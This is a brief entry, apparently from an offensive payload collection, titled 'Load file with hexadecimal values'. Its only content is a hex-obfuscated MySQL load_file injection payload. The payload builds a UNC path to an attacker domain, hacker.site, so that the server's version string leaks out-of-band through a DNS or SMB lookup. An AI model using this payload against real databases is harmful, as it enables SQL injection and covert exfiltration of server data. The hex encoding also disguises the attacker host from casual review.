---
id: f514161d-0c6e-4be2-8b2f-469693d943e4
name: Load file with hexadecimal values
type: command
executor: bash
data: select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
output: null
created_at: '2023-04-06T03:56:35.033625+00:00'
updated_at: '2023-04-10T20:22:53.482257+00:00'
---

# Load file with hexadecimal values

```bash
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```


